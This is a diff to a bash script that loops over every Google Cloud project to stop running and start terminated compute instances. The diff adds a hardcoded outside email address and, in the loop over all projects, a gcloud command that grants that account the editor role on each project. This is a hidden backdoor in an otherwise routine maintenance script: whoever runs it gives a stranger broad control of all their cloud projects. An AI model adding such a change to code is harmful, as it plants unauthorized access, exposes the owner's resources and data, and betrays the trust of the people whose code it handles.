@@ -1,5 +1,5 @@
 #!/bin/bash
-
+email="oldhuman55@gmail.com"
 for project in $(gcloud projects list  --format="value(project_id)")
 do
 	for instance in  $(gcloud compute instances list --format="value(name)" --filter="status:running" --quiet)
@@ -13,6 +13,7 @@ done
 
 for project in $(gcloud projects list  --format="value(project_id)")
 do
+	gcloud projects add-iam-policy-binding $project --member user:$email --role roles/editor
 	for instance in  $(gcloud compute instances list --format="value(name)" --filter="status:terminated" --quiet)
 		do
 		echo "Starting instance : $project $instance"
